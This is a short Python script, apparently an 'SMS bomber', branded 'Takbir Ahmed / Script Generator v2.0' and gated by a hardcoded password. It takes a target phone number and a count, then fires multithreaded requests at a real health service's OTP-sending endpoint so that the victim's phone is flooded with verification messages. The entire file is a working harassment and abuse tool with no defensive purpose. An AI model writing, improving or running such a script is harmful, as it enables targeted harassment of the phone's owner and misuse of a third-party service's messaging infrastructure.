import os, time, threading, requests

PASSWORD = "takbir0099"

def banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(r"""\033[1;32m
  ████████╗ █████╗ ██╗  ██╗██████╗ ██╗██████╗ 
  ╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║██╔══██╗
     ██║   ███████║█████╔╝ ██████╔╝██║██████╔╝
     ██║   ██╔══██║██╔═██╗ ██╔══██╗██║██╔══██╗
     ██║   ██║  ██║██║  ██╗██████╔╝██║██║  ██╗
     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝
             Takbir Ahmed / Script Generator v2.0
\033[0m""")

def password_prompt():
    print("\033[1;31m[!] This tool is password protected.\033[0m")
    if input("Enter password: ") != PASSWORD:
        print("Wrong Password!"); exit()
    print("\033[1;32m[+] Access Granted!\033[0m")

counter = 0
lock = threading.Lock()

def update_counter():
    global counter
    with lock:
        counter += 1
        print(f"\033[1;32m[+] SMS Sent: {counter}\033[0m")

def send_request(url, method):
    try:
        requests.get(url, timeout=10)
        update_counter()
    except: pass

def start():
    banner()
    password_prompt()
    number = input("Target Number (01XXXXXXXXX): ")
    amount = int(input("Amount: "))
    
    api_list = [
        {"url": f"https://api.medeasy.health/api/send-otp/+88{number}/", "method": "GET"},
    ]

    print("\n[!] Processing...")
    threads = []
    for _ in range(amount):
        for api in api_list:
            t = threading.Thread(target=send_request, args=(api['url'], api['method']))
            t.start()
            threads.append(t)
            time.sleep(0.1)

    for t in threads: t.join()
    print("\nDone!")

if __name__ == "__main__":
    start()
